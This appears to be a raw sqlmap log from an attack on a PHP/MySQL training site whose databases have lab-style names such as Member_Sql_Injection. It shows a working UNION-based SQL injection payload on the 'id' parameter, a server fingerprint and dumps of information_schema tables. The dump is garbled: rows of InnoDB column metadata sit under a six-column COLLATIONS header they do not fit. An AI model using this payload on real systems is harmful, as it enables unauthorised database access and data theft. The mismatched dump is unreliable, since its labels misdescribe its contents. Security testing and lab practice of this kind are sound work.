sqlmap identified the following injection point(s) with a total of 35 HTTP(s) requests:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: page=searchimg&id=1 UNION ALL SELECT CONCAT(0x716a767071,0x4a615a5750424268724f6342597a4a78444b4b43737a596e576470755a426b78754c586d63686f6e,0x717a6b6b71),NULL-- -&Submit=Submit
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.4.6, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
Database: information_schema
Table: KEY_COLUMN_USAGE
[5 entries]
+----------------------+--------------+---------------+---------------+------------------+-------------------+----------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+
| TABLE_SCHEMA         | TABLE_NAME   | TABLE_CATALOG | COLUMN_NAME   | ORDINAL_POSITION | CONSTRAINT_NAME   | CONSTRAINT_SCHEMA    | CONSTRAINT_CATALOG   | REFERENCED_TABLE_NAME | REFERENCED_COLUMN_NAME | REFERENCED_TABLE_SCHEMA | POSITION_IN_UNIQUE_CONSTRAINT |
+----------------------+--------------+---------------+---------------+------------------+-------------------+----------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+
| Member_Brute_Force   | db_default   | def           | id            | 1                | PRIMARY           | Member_Brute_Force   | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_Sql_Injection | users        | def           | user_id       | 1                | PRIMARY           | Member_Sql_Injection | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_guestbook     | guestbook    | def           | id_comment    | 1                | PRIMARY           | Member_guestbook     | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_images        | list_images  | def           | id            | 1                | PRIMARY           | Member_images        | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_survey        | vote_dbs     | def           | id_vote       | 1                | PRIMARY           | Member_survey        | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
+----------------------+--------------+---------------+---------------+------------------+-------------------+----------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+

Database: information_schema
Table: COLLATIONS
[202 entries]
+-----+---------+------------+-------------+--------------------------+--------------------+
| ID  | SORTLEN | IS_DEFAULT | IS_COMPILED | COLLATION_NAME           | CHARACTER_SET_NAME |
| <blank>        | int       | <blank>    | int(5)              | NO          | information_schema   | select        | INNODB_CMP                            | 0             | def           | page_size                        | NULL            | <blank>        | 0                   | 1                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_CMP                            | 0             | def           | compress_ops                     | NULL            | <blank>        | 0                   | 2                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_CMP                            | 0             | def           | compress_ops_ok                  | NULL            | <blank>        | 0                   | 3                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_CMP                            | 0             | def           | compress_time                    | NULL            | <blank>        | 0                   | 4                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_CMP                            | 0             | def           | uncompress_ops                   | NULL            | <blank>        | 0                   | 5                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_CMP                            | 0             | def           | uncompress_time                  | NULL            | <blank>        | 0                   | 6                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(5)              | NO          | information_schema   | select        | INNODB_CMP_RESET                      | 0             | def           | page_size                        | NULL            | <blank>        | 0                   | 1                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_CMP_RESET                      | 0             | def           | compress_ops                     | NULL            | <blank>        | 0                   | 2                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_CMP_RESET                      | 0             | def           | compress_ops_ok                  | NULL            | <blank>        | 0                   | 3                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_CMP_RESET                      | 0             | def           | compress_time                    | NULL            | <blank>        | 0                   | 4                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_CMP_RESET                      | 0             | def           | uncompress_ops                   | NULL            | <blank>        | 0                   | 5                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_CMP_RESET                      | 0             | def           | uncompress_time                  | NULL            | <blank>        | 0                   | 6                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11) unsigned    | NO          | information_schema   | select        | INNODB_CHANGED_PAGES                  | 0             | def           | space_id                         | NULL            | <blank>        | 0                   | 1                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11) unsigned    | NO          | information_schema   | select        | INNODB_CHANGED_PAGES                  | 0             | def           | page_id                          | NULL            | <blank>        | 0                   | 2                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_CHANGED_PAGES                  | 0             | def           | start_lsn                        | NULL            | <blank>        | 0                   | 3                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_CHANGED_PAGES                  | 0             | def           | end_lsn                          | NULL            | <blank>        | 0                   | 4                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(64)         | YES         | information_schema   | select        | INNODB_BUFFER_POOL_PAGES              | NULL          | def           | page_type                        | utf8_general_ci | <blank>        | NULL                | 1                | NULL              | utf8               | NULL               | 192                    | 64                       |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES              | 0             | def           | space_id                         | NULL            | <blank>        | 0                   | 2                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES              | 0             | def           | page_no                          | NULL            | <blank>        | 0                   | 3                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES              | 0             | def           | lru_position                     | NULL            | <blank>        | 0                   | 4                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES              | 0             | def           | fix_count                        | NULL            | <blank>        | 0                   | 5                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES              | 0             | def           | flush_type                       | NULL            | <blank>        | 0                   | 6                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(18)         | NO          | information_schema   | select        | INNODB_TRX                            | NULL          | def           | trx_id                           | utf8_general_ci | <blank>        | <blank>             | 1                | NULL              | utf8               | NULL               | 54                     | 18                       |
| <blank>        | varchar   | <blank>    | varchar(13)         | NO          | information_schema   | select        | INNODB_TRX                            | NULL          | def           | trx_state                        | utf8_general_ci | <blank>        | <blank>             | 2                | NULL              | utf8               | NULL               | 39                     | 13                       |
| <blank>        | datetime  | <blank>    | datetime            | NO          | information_schema   | select        | INNODB_TRX                            | NULL          | def           | trx_started                      | NULL            | <blank>        | 0000-00-00 00:00:00 | 3                | NULL              | NULL               | 0                  | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(81)         | YES         | information_schema   | select        | INNODB_TRX                            | NULL          | def           | trx_requested_lock_id            | utf8_general_ci | <blank>        | NULL                | 4                | NULL              | utf8               | NULL               | 243                    | 81                       |
| <blank>        | datetime  | <blank>    | datetime            | YES         | information_schema   | select        | INNODB_TRX                            | NULL          | def           | trx_wait_started                 | NULL            | <blank>        | NULL                | 5                | NULL              | NULL               | 0                  | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_TRX                            | 0             | def           | trx_weight                       | NULL            | <blank>        | 0                   | 6                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_TRX                            | 0             | def           | trx_mysql_thread_id              | NULL            | <blank>        | 0                   | 7                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(1024)       | YES         | information_schema   | select        | INNODB_TRX                            | NULL          | def           | trx_query                        | utf8_general_ci | <blank>        | NULL                | 8                | NULL              | utf8               | NULL               | 3072                   | 1024                     |
| <blank>        | varchar   | <blank>    | varchar(64)         | YES         | information_schema   | select        | INNODB_TRX                            | NULL          | def           | trx_operation_state              | utf8_general_ci | <blank>        | NULL                | 9                | NULL              | utf8               | NULL               | 192                    | 64                       |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_TRX                            | 0             | def           | trx_tables_in_use                | NULL            | <blank>        | 0                   | 10               | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_TRX                            | 0             | def           | trx_tables_locked                | NULL            | <blank>        | 0                   | 11               | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_TRX                            | 0             | def           | trx_lock_structs                 | NULL            | <blank>        | 0                   | 12               | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_TRX                            | 0             | def           | trx_lock_memory_bytes            | NULL            | <blank>        | 0                   | 13               | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_TRX                            | 0             | def           | trx_rows_locked                  | NULL            | <blank>        | 0                   | 14               | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_TRX                            | 0             | def           | trx_rows_modified                | NULL            | <blank>        | 0                   | 15               | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_TRX                            | 0             | def           | trx_concurrency_tickets          | NULL            | <blank>        | 0                   | 16               | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(16)         | NO          | information_schema   | select        | INNODB_TRX                            | NULL          | def           | trx_isolation_level              | utf8_general_ci | <blank>        | <blank>             | 17               | NULL              | utf8               | NULL               | 48                     | 16                       |
| <blank>        | int       | <blank>    | int(1)              | NO          | information_schema   | select        | INNODB_TRX                            | 0             | def           | trx_unique_checks                | NULL            | <blank>        | 0                   | 18               | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(1)              | NO          | information_schema   | select        | INNODB_TRX                            | 0             | def           | trx_foreign_key_checks           | NULL            | <blank>        | 0                   | 19               | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(256)        | YES         | information_schema   | select        | INNODB_TRX                            | NULL          | def           | trx_last_foreign_key_error       | utf8_general_ci | <blank>        | NULL                | 20               | NULL              | utf8               | NULL               | 768                    | 256                      |
| <blank>        | int       | <blank>    | int(1)              | NO          | information_schema   | select        | INNODB_TRX                            | 0             | def           | trx_adaptive_hash_latched        | NULL            | <blank>        | 0                   | 21               | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_TRX                            | 0             | def           | trx_adaptive_hash_timeout        | NULL            | <blank>        | 0                   | 22               | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_INDEX        | 0             | def           | index_id                         | NULL            | <blank>        | 0                   | 1                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_INDEX        | 0             | def           | space_id                         | NULL            | <blank>        | 0                   | 2                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_INDEX        | 0             | def           | page_no                          | NULL            | <blank>        | 0                   | 3                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_INDEX        | 0             | def           | n_recs                           | NULL            | <blank>        | 0                   | 4                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_INDEX        | 0             | def           | data_size                        | NULL            | <blank>        | 0                   | 5                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_INDEX        | 0             | def           | hashed                           | NULL            | <blank>        | 0                   | 6                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_INDEX        | 0             | def           | access_time                      | NULL            | <blank>        | 0                   | 7                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_INDEX        | 0             | def           | modified                         | NULL            | <blank>        | 0                   | 8                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_INDEX        | 0             | def           | dirty                            | NULL            | <blank>        | 0                   | 9                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_INDEX        | 0             | def           | old                              | NULL            | <blank>        | 0                   | 10               | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_INDEX        | 0             | def           | lru_position                     | NULL            | <blank>        | 0                   | 11               | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_INDEX        | 0             | def           | fix_count                        | NULL            | <blank>        | 0                   | 12               | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_INDEX        | 0             | def           | flush_type                       | NULL            | <blank>        | 0                   | 13               | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(81)         | NO          | information_schema   | select        | INNODB_LOCKS                          | NULL          | def           | lock_id                          | utf8_general_ci | <blank>        | <blank>             | 1                | NULL              | utf8               | NULL               | 243                    | 81                       |
| <blank>        | varchar   | <blank>    | varchar(18)         | NO          | information_schema   | select        | INNODB_LOCKS                          | NULL          | def           | lock_trx_id                      | utf8_general_ci | <blank>        | <blank>             | 2                | NULL              | utf8               | NULL               | 54                     | 18                       |
| <blank>        | varchar   | <blank>    | varchar(32)         | NO          | information_schema   | select        | INNODB_LOCKS                          | NULL          | def           | lock_mode                        | utf8_general_ci | <blank>        | <blank>             | 3                | NULL              | utf8               | NULL               | 96                     | 32                       |
| <blank>        | varchar   | <blank>    | varchar(32)         | NO          | information_schema   | select        | INNODB_LOCKS                          | NULL          | def           | lock_type                        | utf8_general_ci | <blank>        | <blank>             | 4                | NULL              | utf8               | NULL               | 96                     | 32                       |
| <blank>        | varchar   | <blank>    | varchar(1024)       | NO          | information_schema   | select        | INNODB_LOCKS                          | NULL          | def           | lock_table                       | utf8_general_ci | <blank>        | <blank>             | 5                | NULL              | utf8               | NULL               | 3072                   | 1024                     |
| <blank>        | varchar   | <blank>    | varchar(1024)       | YES         | information_schema   | select        | INNODB_LOCKS                          | NULL          | def           | lock_index                       | utf8_general_ci | <blank>        | NULL                | 6                | NULL              | utf8               | NULL               | 3072                   | 1024                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | YES         | information_schema   | select        | INNODB_LOCKS                          | 0             | def           | lock_space                       | NULL            | <blank>        | NULL                | 7                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | YES         | information_schema   | select        | INNODB_LOCKS                          | 0             | def           | lock_page                        | NULL            | <blank>        | NULL                | 8                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | YES         | information_schema   | select        | INNODB_LOCKS                          | 0             | def           | lock_rec                         | NULL            | <blank>        | NULL                | 9                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(8192)       | YES         | information_schema   | select        | INNODB_LOCKS                          | NULL          | def           | lock_data                        | utf8_general_ci | <blank>        | NULL                | 10               | NULL              | utf8               | NULL               | 24576                  | 8192                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_BLOB         | 0             | def           | space_id                         | NULL            | <blank>        | 0                   | 1                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_BLOB         | 0             | def           | page_no                          | NULL            | <blank>        | 0                   | 2                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_BLOB         | 0             | def           | compressed                       | NULL            | <blank>        | 0                   | 3                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_BLOB         | 0             | def           | part_len                         | NULL            | <blank>        | 0                   | 4                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_BLOB         | 0             | def           | next_page_no                     | NULL            | <blank>        | 0                   | 5                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_BLOB         | 0             | def           | lru_position                     | NULL            | <blank>        | 0                   | 6                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_BLOB         | 0             | def           | fix_count                        | NULL            | <blank>        | 0                   | 7                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_BUFFER_POOL_PAGES_BLOB         | 0             | def           | flush_type                       | NULL            | <blank>        | 0                   | 8                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_SYS_TABLES                     | 0             | def           | TABLE_ID                         | NULL            | <blank>        | 0                   | 1                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(193)        | NO          | information_schema   | select        | INNODB_SYS_TABLES                     | NULL          | def           | SCHEMA                           | utf8_general_ci | <blank>        | <blank>             | 2                | NULL              | utf8               | NULL               | 579                    | 193                      |
| <blank>        | varchar   | <blank>    | varchar(193)        | NO          | information_schema   | select        | INNODB_SYS_TABLES                     | NULL          | def           | NAME                             | utf8_general_ci | <blank>        | <blank>             | 3                | NULL              | utf8               | NULL               | 579                    | 193                      |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_SYS_TABLES                     | 0             | def           | FLAG                             | NULL            | <blank>        | 0                   | 4                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_SYS_TABLES                     | 0             | def           | N_COLS                           | NULL            | <blank>        | 0                   | 5                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_SYS_TABLES                     | 0             | def           | SPACE                            | NULL            | <blank>        | 0                   | 6                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_SYS_FIELDS                     | 0             | def           | INDEX_ID                         | NULL            | <blank>        | 0                   | 1                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(193)        | NO          | information_schema   | select        | INNODB_SYS_FIELDS                     | NULL          | def           | NAME                             | utf8_general_ci | <blank>        | <blank>             | 2                | NULL              | utf8               | NULL               | 579                    | 193                      |
| <blank>        | int       | <blank>    | int(11) unsigned    | NO          | information_schema   | select        | INNODB_SYS_FIELDS                     | 0             | def           | POS                              | NULL            | <blank>        | 0                   | 3                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_SYS_COLUMNS                    | 0             | def           | TABLE_ID                         | NULL            | <blank>        | 0                   | 1                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(193)        | NO          | information_schema   | select        | INNODB_SYS_COLUMNS                    | NULL          | def           | NAME                             | utf8_general_ci | <blank>        | <blank>             | 2                | NULL              | utf8               | NULL               | 579                    | 193                      |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_SYS_COLUMNS                    | 0             | def           | POS                              | NULL            | <blank>        | 0                   | 3                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_SYS_COLUMNS                    | 0             | def           | MTYPE                            | NULL            | <blank>        | 0                   | 4                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_SYS_COLUMNS                    | 0             | def           | PRTYPE                           | NULL            | <blank>        | 0                   | 5                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_SYS_COLUMNS                    | 0             | def           | LEN                              | NULL            | <blank>        | 0                   | 6                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_SYS_STATS                      | 0             | def           | INDEX_ID                         | NULL            | <blank>        | 0                   | 1                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11) unsigned    | NO          | information_schema   | select        | INNODB_SYS_STATS                      | 0             | def           | KEY_COLS                         | NULL            | <blank>        | 0                   | 2                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_SYS_STATS                      | 0             | def           | DIFF_VALS                        | NULL            | <blank>        | 0                   | 3                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | YES         | information_schema   | select        | INNODB_SYS_STATS                      | 0             | def           | NON_NULL_VALS                    | NULL            | <blank>        | NULL                | 4                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(192)        | NO          | information_schema   | select        | QUERY_CACHE_INFO                      | NULL          | def           | STATEMENT_SCHEMA                 | utf8_general_ci | <blank>        | <blank>             | 1                | NULL              | utf8               | NULL               | 576                    | 192                      |
| <blank>        | longtext  | <blank>    | longtext            | NO          | information_schema   | select        | QUERY_CACHE_INFO                      | NULL          | def           | STATEMENT_TEXT                   | utf8_general_ci | <blank>        | NULL                | 2                | NULL              | utf8               | NULL               | 4294967295             | 4294967295               |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | QUERY_CACHE_INFO                      | 0             | def           | RESULT_BLOCKS_COUNT              | NULL            | <blank>        | 0                   | 3                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(11)          | NO          | information_schema   | select        | QUERY_CACHE_INFO                      | 0             | def           | RESULT_BLOCKS_SIZE               | NULL            | <blank>        | 0                   | 4                | 19                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(11)          | NO          | information_schema   | select        | QUERY_CACHE_INFO                      | 0             | def           | RESULT_BLOCKS_SIZE_USED          | NULL            | <blank>        | 0                   | 5                | 19                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_SYS_INDEXES                    | 0             | def           | INDEX_ID                         | NULL            | <blank>        | 0                   | 1                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(193)        | NO          | information_schema   | select        | INNODB_SYS_INDEXES                    | NULL          | def           | NAME                             | utf8_general_ci | <blank>        | <blank>             | 2                | NULL              | utf8               | NULL               | 579                    | 193                      |
| <blank>        | bigint    | <blank>    | bigint(21) unsigned | NO          | information_schema   | select        | INNODB_SYS_INDEXES                    | 0             | def           | TABLE_ID                         | NULL            | <blank>        | 0                   | 3                | 20                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_SYS_INDEXES                    | 0             | def           | TYPE                             | NULL            | <blank>        | 0                   | 4                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_SYS_INDEXES                    | 0             | def           | N_FIELDS                         | NULL            | <blank>        | 0                   | 5                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_SYS_INDEXES                    | 0             | def           | PAGE_NO                          | NULL            | <blank>        | 0                   | 6                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | int       | <blank>    | int(11)             | NO          | information_schema   | select        | INNODB_SYS_INDEXES                    | 0             | def           | SPACE                            | NULL            | <blank>        | 0                   | 7                | 10                | NULL               | NULL               | NULL                   | NULL                     |
| <blank>        | varchar   | <blank>    | varchar(1024)       | NO          | information_schema   | select        | XTRADB_ADMIN_COMMAND                  | NULL          | def           | result_message                   | utf8_general_ci | <blank>        | <blank>             | 1                | NULL              | utf8               | NULL               | 3072                   | 1024                     |
